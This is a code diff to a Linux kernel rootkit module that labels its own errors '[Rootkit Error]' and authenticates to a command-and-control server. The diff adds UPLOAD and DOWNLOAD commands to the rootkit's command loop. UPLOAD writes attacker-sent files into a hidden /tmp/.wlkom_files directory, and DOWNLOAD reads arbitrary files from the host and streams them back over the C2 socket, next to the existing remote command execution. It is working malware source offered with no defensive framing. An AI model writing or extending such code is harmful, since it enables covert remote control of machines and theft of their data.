@@ -146,6 +146,109 @@ static void execute_and_send_output(char *cmd)
     kfree(cmd_redirect);
 }
 
+/* Handle UPLOAD command - write file to disk */
+static void handle_upload(char *cmd)
+{
+    char filename[256];
+    unsigned long filesize;
+    char filepath[512];
+    struct file *file;
+    char *filebuf;
+    int ret;
+    
+    if (sscanf(cmd, "UPLOAD %255s %lu", filename, &filesize) != 2) {
+        send_reply("[Rootkit Error]: Invalid UPLOAD format.\n\n");
+        return;
+    }
+    
+    snprintf(filepath, sizeof(filepath), "/tmp/.wlkom_files/%s", filename);
+    
+    /* Create upload directory if it doesn't exist */
+    call_usermodehelper("/bin/mkdir", (char *[]){ "/bin/mkdir", "-p", "/tmp/.wlkom_files", NULL }, 
+                       (char *[]){ "HOME=/", NULL }, UMH_WAIT_PROC);
+    
+    /* Allocate buffer */
+    filebuf = kmalloc(filesize, GFP_KERNEL);
+    if (!filebuf) {
+        send_reply("[Rootkit Error]: kmalloc failed for file buffer.\n\n");
+        return;
+    }
+    
+    /* Read file data from socket */
+    struct msghdr msg = { 0 };
+    struct kvec vec = {
+        .iov_base = filebuf,
+        .iov_len = filesize,
+    };
+    
+    ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, filesize, 0);
+    if (ret < 0) {
+        send_reply("[Rootkit Error]: Failed to receive file data.\n\n");
+        kfree(filebuf);
+        return;
+    }
+    
+    /* Write to file */
+    file = filp_open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+    if (IS_ERR(file)) {
+        send_reply("[Rootkit Error]: Failed to open file for writing.\n\n");
+        kfree(filebuf);
+        return;
+    }
+    
+    kernel_write(file, filebuf, filesize, &file->f_pos);
+    filp_close(file, NULL);
+    
+    kfree(filebuf);
+    
+    send_reply("[+] File uploaded successfully.\n\n");
+}
+
+/* Handle DOWNLOAD command - read file from disk */
+static void handle_download(char *cmd)
+{
+    char filepath[512];
+    struct file *file;
+    char *filebuf;
+    loff_t pos = 0;
+    ssize_t bytes_read;
+    
+    if (sscanf(cmd, "DOWNLOAD %511s", filepath) != 1) {
+        send_reply("[Rootkit Error]: Invalid DOWNLOAD format.\n\n");
+        return;
+    }
+    
+    /* Open file for reading */
+    file = filp_open(filepath, O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        send_reply("[Rootkit Error]: File not found or cannot be read.\n\n");
+        return;
+    }
+    
+    /* Allocate buffer (max 1MB per download) */
+    filebuf = kmalloc(1024 * 1024, GFP_KERNEL);
+    if (!filebuf) {
+        send_reply("[Rootkit Error]: kmalloc failed.\n\n");
+        filp_close(file, NULL);
+        return;
+    }
+    
+    /* Read and send file content */
+    bytes_read = kernel_read(file, filebuf, 1024 * 1024 - 1, &pos);
+    if (bytes_read > 0) {
+        struct msghdr msg = { 0 };
+        struct kvec vec = {
+            .iov_base = filebuf,
+            .iov_len = bytes_read,
+        };
+        kernel_sendmsg(conn_sock, &msg, &vec, 1, bytes_read);
+    }
+    
+    filp_close(file, NULL);
+    kfree(filebuf);
+    
+    send_reply("--- End of Output ---\n\n");
+}
 static int authenticate_c2(void)
 {
     char buf[256];
@@ -227,17 +330,24 @@ static int connection_thread(void *data)
         pr_info("wlkom: C2 authenticated\n");
 
         while (!kthread_should_stop()) {
-            memset(buf, 0, sizeof(buf));
-            ret = recv_line(buf, sizeof(buf));
-            if (ret <= 0)
-                break;
+        memset(buf, 0, sizeof(buf));
+        ret = recv_line(buf, sizeof(buf));
+        if (ret <= 0)
+            break;
 
-            if (strlen(buf) == 0)
-                continue;
+        if (strlen(buf) == 0)
+            continue;
 
+        /* Check for special commands */
+        if (strncmp(buf, "UPLOAD ", 7) == 0) {
+            handle_upload(buf);
+        } else if (strncmp(buf, "DOWNLOAD ", 9) == 0) {
+            handle_download(buf);
+        } else {
             /* Handle processing, capturing and network streaming internally */
             execute_and_send_output(buf);
         }
+    }
 
 disconnect:
         kernel_sock_shutdown(conn_sock, SHUT_RDWR);
